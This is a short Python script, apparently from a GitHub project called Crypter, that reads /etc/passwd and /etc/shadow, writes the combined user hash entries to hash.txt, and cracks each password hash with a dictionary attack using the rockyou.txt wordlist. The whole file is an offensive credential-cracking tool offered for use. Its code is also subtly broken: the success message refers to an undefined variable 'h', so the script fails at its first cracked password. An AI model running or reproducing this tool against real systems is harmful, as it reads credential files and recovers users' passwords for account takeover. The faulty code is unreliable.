# Title.......: Crypter
# Description.: Crack Linux Password with Python
# Author......: BgRopay
# Usage.......: python3 crypter.py
# Homepage....: github.com/bgropay/crypter

import os
import crypt 
from colorama import Fore

g = Fore.LIGHTGREEN_EX
p = Fore.LIGHTWHITE_EX
r = Fore.RESET

# Paths to passwd and shadow files
passwd_file = "/etc/passwd"
shadow_file = "/etc/shadow"
output_file = "hash.txt"

passwd_dict = {}
shadow_dict = {}

# Read /etc/passwd file
with open(passwd_file, 'r') as passwd:
    for line in passwd:
        parts = line.strip().split(':')
        if len(parts) > 1:
            username = parts[0]
            gecos = parts[4]  # Extract GECOS field
            if 'user' in gecos.lower():  # Check for 'user' in GECOS
                passwd_dict[username] = parts

# Read /etc/shadow file
with open(shadow_file, 'r') as shadow:
    for line in shadow:
        parts = line.strip().split(':')
        if len(parts) > 1:
            username = parts[0]
            if username in passwd_dict:
                shadow_dict[username] = parts

# Combine information for users present in both files
with open(output_file, 'w') as output:
    for username in passwd_dict:
        if username in shadow_dict:
            passwd_parts = passwd_dict[username]
            shadow_parts = shadow_dict[username]
            combined = ':'.join([
                passwd_parts[0],  # username
                shadow_parts[1],  # hashed password
                passwd_parts[2],  # UID
                passwd_parts[3],  # GID
                passwd_parts[4],  # GECOS
                passwd_parts[5],  # home directory
                passwd_parts[6]   # shell
            ])
            output.write(combined + '\n')

            # Attempt to crack password using rockyou.txt wordlist
            wordlist_path = "/usr/share/wordlists/rockyou.txt"
            
            with open(wordlist_path, 'r', encoding='latin-1') as wordlist_file:
                passwords = wordlist_file.readlines()

            hashed_password = shadow_parts[1]
            for password in passwords:
                password = password.strip()
                if crypt.crypt(password, hashed_password) == hashed_password:
                    print(f"{h}[+] {p}Username: {username}, Password: {password}{r}")
                    break
